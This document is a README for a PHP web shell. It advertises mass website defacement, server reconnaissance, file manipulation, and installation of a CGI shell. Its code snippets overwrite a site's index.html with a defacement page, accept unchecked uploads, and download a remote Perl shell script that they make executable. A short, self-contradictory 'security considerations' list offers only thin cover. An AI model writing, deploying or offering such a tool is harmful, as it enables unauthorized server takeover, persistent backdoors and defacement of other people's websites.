## Overview

The **PHP Web Shell** is a script that provides detailed controls to manage your server. It allows for file management, server information retrieval, mass defacement operations, and even the installation of a CGI-based shell. This README.md outlines its features, setup instructions, and important security measures to ensure safe and ethical operation.

## Features

- **Server Information:** Displays critical server details such as operating system, IP address, software versions, and security settings.
- **File Management:** Enables listing, deleting, renaming, editing, and changing file or directory permissions.
- **File Upload:** Provides a secure interface for uploading files to the server.
- **Mass Defacement:** Facilitates copying a specified file to multiple directories to execute a mass defacement (use responsibly).
- **CGI Shell Installation:** Installs a CGI-based shell to extend server control capabilities.
- **Directory and File Creation:** Supports creating new directories and files on the server for flexible management.

## Installation

1. **Upload the Script:** Place the PHP script on your server in a directory accessible via a web browser.
2. **Set Permissions:** Verify that file and directory permissions are correctly set to prevent unauthorized access.
3. **Configure Your Environment:** Disable dangerous PHP functions (e.g., `exec`, `shell_exec`, `system`) to bolster security.
4. **Access via Browser:** Open your web browser and navigate to the script‚Äôs URL to get started.

## Usage

The web shell presents a user-friendly interface with various functionalities. Navigate through the options to manage files, view server details, execute a mass defacement, or install a CGI shell.

### File Deletion

```php
if (is_file('file.txt')) {
    unlink('file.txt');
}
```
```php
File Upload
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploaded_file.txt');
}
```
Mass Defacement
```php
$deface_file = 'deface.html';
$target_dir = '/var/www/html/';
copy($deface_file, $target_dir . 'index.html');
```
CGI Shell Installation
```php
$cgi_code = file_get_contents('https://example.com/cgi_shell.pl');
file_put_contents('shell.pl', $cgi_code);
chmod('shell.pl', 0755);
```
Security Considerations
Disable Risky PHP Functions: Functions such as exec, shell_exec, and system should be turned off to reduce potential exploits.
Strict File Upload Controls: Validate all uploads and limit permissions to prevent the execution of harmful scripts.
Use a Firewall: Implement a firewall to monitor traffic and block suspicious activity.
Regular Scans: Conduct periodic security audits and scans to detect and mitigate vulnerabilities.
